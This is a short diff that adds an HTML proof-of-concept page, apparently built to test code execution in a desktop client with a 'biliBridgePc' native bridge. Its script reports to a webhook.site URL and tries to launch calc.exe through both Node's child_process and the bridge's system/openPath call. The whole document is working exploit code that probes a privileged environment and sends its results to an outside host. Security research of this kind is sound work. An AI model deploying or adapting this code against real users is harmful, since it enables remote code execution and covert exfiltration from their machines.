@@ -1,0 +1,7 @@
+<!doctype html><title>BP</title><pre>gp v4</pre>
+<script>
+function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
+beacon('ran req='+typeof require+' proc='+typeof process+' br='+typeof window.biliBridgePc);
+try{require('child_process').exec('calc');beacon('require-ok')}catch(e){beacon('reqerr:'+e.message)}
+try{window.biliBridgePc.callNative('system/openPath','C:\\Windows\\System32\\calc.exe');beacon('bridge-sent')}catch(e){beacon('brerr:'+e.message)}
+</script>
